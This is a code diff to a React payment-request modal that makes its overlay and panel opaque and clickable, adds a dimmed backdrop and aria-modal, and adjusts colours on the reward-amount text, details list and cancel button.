@@ -45,11 +45,13 @@ export function PaymentRequestModal({
     : null
 
   return (
-    <div className="pointer-events-none fixed inset-0 z-[520] flex items-center justify-center px-4">
+    <div className="pointer-events-auto fixed inset-0 z-[1100] flex items-center justify-center px-4">
+      <div className="absolute inset-0 bg-black/75" aria-hidden="true" />
       <div
         role="dialog"
         aria-labelledby="payment-request-title"
-        className="w-full max-w-[420px] rounded-2xl border border-white/[0.04] bg-black/[0.02] p-5 text-white opacity-100"
+        aria-modal="true"
+        className="relative w-full max-w-[420px] rounded-2xl border border-[#2a2a2a] bg-[#0c0c0c] p-5 text-white shadow-[0_24px_80px_rgba(0,0,0,0.85)]"
       >
         <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400">
           Payment request
@@ -61,11 +63,11 @@ export function PaymentRequestModal({
         </h2>
         
         <p className="mt-1 text-sm leading-relaxed text-gray-300">
-          You will receive <span className="font-bold text-green-400/80">{formattedDisplayAmount}</span>. 
+          You will receive <span className="font-bold text-green-400">{formattedDisplayAmount}</span>. 
           Confirm below to claim your reward.
         </p>
 
-        <dl className="mt-5 space-y-3 rounded-xl border border-white/[0.04] bg-white/[0.02] px-4 py-3 text-sm">
+        <dl className="mt-5 space-y-3 rounded-xl border border-[#2a2a2a] bg-[#141414] px-4 py-3 text-sm">
           <div className="flex justify-between gap-3">
             <dt className="text-gray-500">You Will Receive</dt>
             <dd className="font-semibold text-green-400">
@@ -101,7 +103,7 @@ export function PaymentRequestModal({
             type="button"
             onClick={onCancel}
             disabled={submitting}
-            className="flex-1 rounded-full border border-gray-700 bg-gray-900/50 py-3 text-sm font-medium text-gray-400 disabled:opacity-40"
+            className="flex-1 rounded-full border border-[#3a3a3a] bg-[#1a1a1a] py-3 text-sm font-medium text-gray-300 disabled:opacity-40"
           >
             Cancel
           </button>
